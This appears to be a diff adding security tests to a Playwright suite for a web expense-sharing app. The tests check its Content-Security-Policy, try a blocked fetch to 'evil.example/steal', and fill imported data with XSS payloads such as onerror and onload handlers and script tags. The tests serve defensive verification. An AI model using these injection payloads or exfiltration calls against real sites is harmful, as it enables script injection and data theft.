@@ -257,6 +257,71 @@ const stored=pg=>pg.evaluate(()=>JSON.stringify(normalize(JSON.parse(localStorag
    const inputs=await Q.pg.evaluate(()=>Object.values(S.volumes[0].expenses.find(e=>e.desc==='Thirds').inputs));
    ok(inputs.length===3 && inputs.every(x=>/^33\.333333333[34]$/.test(x)),'percent inputs as typed survive reload and a backup round trip '+JSON.stringify(inputs));
    await P.c.close(); await Q.c.close(); }
+ // ── 11. Security (all-out round, 2026-11-11): CSP, both real origins, hostile markup in every field ──
+ { const html=fs.readFileSync(path.join(process.cwd(),'index.html'),'utf8');
+   const csp=(/<meta http-equiv="Content-Security-Policy" content="([^"]+)">/.exec(html)||[])[1]||'';
+   const dir=n=>(csp.split(';').map(s=>s.trim().split(/\s+/)).find(d=>d[0]===n)||[]).slice(1);
+   const before=html.indexOf('Content-Security-Policy')>=0 && html.indexOf('Content-Security-Policy')<html.indexOf('<script>') && html.indexOf('Content-Security-Policy')<html.indexOf('<style>');
+   ok(before && dir('default-src').join()==="'none'" && dir('script-src').length===1 && /^'sha256-/.test(dir('script-src')[0]) && ['object-src','base-uri','form-action'].every(d=>dir(d).join()==="'none'")
+     && dir('connect-src').sort().join(' ')==="'self' https://hati-sync.gerymefernando.workers.dev wss://hati-sync.gerymefernando.workers.dev" && /<meta name="referrer" content="no-referrer">/.test(html),
+     'CSP meta before any script or style: default none, script only by hash, no object/base/form, connect only to this origin and the sync Worker; no referrer: '+csp);
+   // The policy is enforced: injected markup, a dynamic script and a fetch to another host all fail.
+   const c=await b.newContext({serviceWorkers:'block'}); await c.addInitScript(noSync); const pg=await c.newPage(); await pg.goto(URL);
+   const r=await pg.evaluate(async()=>{ window.__pwn=0; const box=document.createElement('div'); document.body.append(box);
+     box.innerHTML='<img src="x" onerror="window.__pwn++"><svg onload="window.__pwn++"></svg>';
+     const s=document.createElement('script'); s.textContent='window.__pwn++'; document.body.append(s);
+     let fetched=true; try { await fetch('https://evil.example/steal'); } catch(e) { fetched=false; }
+     let evaled=true; try { eval('1'); } catch(e) { evaled=false; }
+     await new Promise(r=>setTimeout(r,200)); box.remove(); s.remove(); return {pwn:window.__pwn,fetched,evaled}; });
+   ok(r.pwn===0 && !r.fetched && !r.evaled,'CSP blocks injected handlers, injected scripts, eval and fetches to other hosts '+JSON.stringify(r));
+   await c.close(); }
+ // The shipped page runs on both real origins (the APK's assets and GitHub Pages) with no CSP violation, live sync included.
+ for (const [kind,origin,base] of [['android','https://appassets.androidplatform.net','/assets/app/'],['iphone','https://p1xellzxc.github.io','/HATI_v2/app/']]) {
+   const c=await b.newContext({...PLAT[kind].dev,serviceWorkers:'block'}); await wire(c); await c.addInitScript(PLAT[kind].init);
+   await c.addInitScript(()=>{ window.__csp=[]; document.addEventListener('securitypolicyviolation',e=>window.__csp.push(e.violatedDirective+' '+e.blockedURI)); });
+   const MIME={html:'text/html',js:'text/javascript',webmanifest:'application/manifest+json',png:'image/png',woff2:'font/woff2'};
+   await c.route(u=>u.origin===origin,rt=>{ const p=new globalThis.URL(rt.request().url()).pathname; if (!p.startsWith(base)) return rt.fulfill({status:404,body:''});
+     const f=path.join(process.cwd(),p.slice(base.length)||'index.html'); if (!fs.existsSync(f)||fs.statSync(f).isDirectory()) return rt.fulfill({status:404,body:''});
+     return rt.fulfill({status:200,headers:{'content-type':MIME[f.split('.').pop()]||'application/octet-stream'},body:fs.readFileSync(f)}); });
+   const pg=await c.newPage(); const pe=[]; pg.on('pageerror',e=>pe.push(e.message)); pg.on('console',m=>{ if(m.type()==='error') pe.push(m.text()); });
+   await pg.goto(origin+base+(kind==='android'?'index.html':'')); await pg.waitForSelector('#app .vol');
+   await pg.evaluate(()=>{ ui.volId=S.volumes[0].id; go('volume'); shareSheet(); });
+   await pg.waitForFunction(()=>/#join=[\w-]+\.[\w-]+$/.test(shareLink),null,{timeout:10000}).catch(()=>{});
+   const link=await pg.evaluate(()=>shareLink), sock=await pg.evaluate(()=>{ const r=RT[S.volumes[0].id]; return !!(r&&r.ws); });
+   // the live link opens on the published origin, and the room and key leave the address bar at once
+   const Q=await c.newPage(); Q.on('pageerror',e=>pe.push(e.message)); await Q.goto(link.replace('https://p1xellzxc.github.io/HATI_v2/app/',origin+base)); await Q.waitForSelector('#s-who',{timeout:10000}).catch(()=>{});
+   const q=await Q.evaluate(()=>({hash:location.hash,href:location.href,csp:window.__csp}));
+   const v=await pg.evaluate(()=>window.__csp);
+   ok(/#join=[\w-]{22,}\.[\w-]{43}$/.test(link) && link.startsWith('https://p1xellzxc.github.io/HATI_v2/app/') && sock && v.length===0 && q.csp.length===0 && pe.length===0,
+     `[${kind}] ${origin}${base}: renders, shares live (PUT and WebSocket to the Worker) with no CSP violation or console error `+JSON.stringify({v,q:q.csp,pe:pe.slice(0,3)}));
+   ok(!q.href.includes('#join') && await Q.locator('#s-who').count()===1,`[${kind}] a live invite opens the join sheet and its room and key leave the address bar (${q.href})`);
+   await c.close(); }
+ // Hostile markup in every text field of an imported volume (title, member names, descriptions, notes, split inputs, an
+ // unknown category and currency) never becomes markup on any screen, sheet, picker, chip or toast.
+ { const P=await phone('android',{store:EMPTY});
+   const X=['"><img src=x onerror=__x++>','<svg/onload=__x++>',"'><script>__x++</script>",'</textarea><b id=inj>'];
+   const code=JSON.stringify({app:'hati2-mock',v:1,volume:{id:'xssVol',title:X[0],type:'<b>',currency:X[1],meId:'a',
+     members:['a','b','c','d'].map((id,i)=>({id,name:X[i]})),
+     expenses:[0,1,2,3].map(i=>({id:'e'+i,desc:X[i]+' '+X[(i+1)%4],amount:400,paidBy:'abcd'[i],category:X[0],date:'2026-11-0'+(i+1),splitType:i===1?'percent':'equal',splits:{a:100,b:100,c:100,d:100},inputs:i===1?{a:'"><b id=inj>',b:'25',c:'25',d:'25'}:{},note:X.join(' ')})),
+     settlements:[{id:'s1',from:'b',to:'a',amount:100,date:'2026-11-05'}],deleted:[]}});
+   await P.pg.evaluate(()=>{ window.__x=0; });
+   const scan=()=>P.pg.evaluate(()=>window.__x+[...document.querySelectorAll('*')].filter(e=>e.id==='inj'||/^(IMG|IFRAME|OBJECT|EMBED)$/.test(e.tagName)||(e.tagName==='SCRIPT'&&e!==document.scripts[0])||[...e.attributes].some(a=>/^on/i.test(a.name))).length);
+   let hits=0; const seen=[];
+   const at=async n=>{ await P.pg.waitForTimeout(120); const k=await scan(); hits+=k; if (k) seen.push(n);
+     const n2=await P.pg.locator('hati-pick[data-mode=list] .pick-btn:visible').count();
+     for (let i=0;i<n2;i++) { await P.pg.locator('hati-pick[data-mode=list] .pick-btn:visible').nth(i).click(); const j=await scan(); hits+=j; if (j) seen.push(n+' picker'); await P.pg.keyboard.press('Escape'); } };
+   await P.pg.locator('[data-act=import]').first().click(); await P.pg.fill('#s-paste',code); await P.pg.locator('#s-go').click(); await at('join sheet');
+   await pick(P.pg,'s-who','a'); await P.pg.locator('#s-go').click(); await at('volume and toast');
+   for (const [n,f] of [['hub',()=>go('hub')],['volume options',()=>volActsSheet('xssVol')],['history',()=>{ closeSheet(); ui.volId='xssVol'; go('history'); }],
+     ['volume menu',()=>{ go('volume'); volMenuSheet(); }],['edit volume',()=>{ closeSheet(); volumeSheet(vol()); }],['edit member',()=>{ closeSheet(); editMemberSheet(vol().members[1]); }],
+     ['settle up',()=>{ closeSheet(); settleSheet(null); }],['delete volume',()=>{ closeSheet(); deleteVolume('xssVol'); }],['merge sheet',()=>{ closeSheet(); importSheet(); }],
+     ['edit expense',()=>{ closeSheet(); openExpense(vol().expenses[1]); }]]) {
+     await P.pg.evaluate(f); if (n==='merge sheet') { await P.pg.fill('#s-paste',code); await P.pg.locator('#s-go').click(); } await at(n); }
+   await P.pg.evaluate(()=>{ leave(); }); await P.pg.waitForTimeout(300); await P.pg.evaluate(()=>openExpense(null)); await P.pg.waitForTimeout(300);
+   await P.pg.fill('#f-desc','<'); await at('suggestion chips'); await P.pg.locator('#descSug [data-sug]').first().click(); await at('suggestion applied');
+   await P.pg.fill('#f-desc',X[0]+' '+X[1]); await at('"Last time" chip');
+   ok(hits===0,'hostile text in every field of an imported volume stays text on every screen, sheet, picker, chip and toast '+JSON.stringify(seen));
+   await P.c.close(); }
  for (const k of Object.keys(src)) await src[k].P.c.close();
  ok(errs.length===0,'no console errors in the data in/out checks '+JSON.stringify(errs.slice(0,5)));
  fs.rmSync(TMP,{recursive:true,force:true});
